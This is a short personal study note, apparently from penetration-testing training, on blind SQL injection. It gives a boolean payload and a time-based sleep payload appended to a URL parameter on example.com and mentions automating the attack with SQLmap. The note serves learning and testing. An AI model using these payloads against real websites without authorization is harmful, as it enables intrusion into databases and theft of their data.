---
title: Blind SQL Attacks
updated: 2025-04-22 11:43:40Z
created: 2025-04-22 11:37:08Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

## Blind SQL Injections
If the Web application URL takes an input field :eg 
`http://example.com/index.php?user=offsec`
Try the payload:
`http://example.com/index.php?user=offsec' AND 1=1 -- //`

**Time-Base Payload:**
(if query is true, the application will take 3 seconds to return)
`http://example.com/index.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //`
This can be automated with **SQLmap**